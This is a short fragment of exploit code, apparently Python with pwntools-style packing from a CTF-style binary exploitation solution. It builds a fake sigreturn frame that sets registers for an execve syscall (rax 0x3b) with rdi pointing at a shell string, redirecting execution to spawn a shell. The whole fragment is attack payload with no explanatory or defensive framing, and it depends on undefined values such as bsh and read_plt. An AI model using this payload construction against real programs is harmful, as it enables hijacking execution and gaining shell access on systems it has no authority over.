





sigframe = p64(read_plt) + p64(0x0)
sigframe += (p64(0x0) * 2) * 6
sigframe += p64(bsh) + p64(0x0)       # rdi rsi
sigframe += p64(0x601040) + p64(0x0)  # rbp rbx
sigframe += p64(0x0) + p64(0x3b)      # rdx rax
sigframe += p64(0x0) + p64(0x601040)  # rcx rsp
sigframe += p64(read_plt) + p64(0x0)  # rip eflags
sigframe += p64(0x33) + p64(0x0)      # cs  err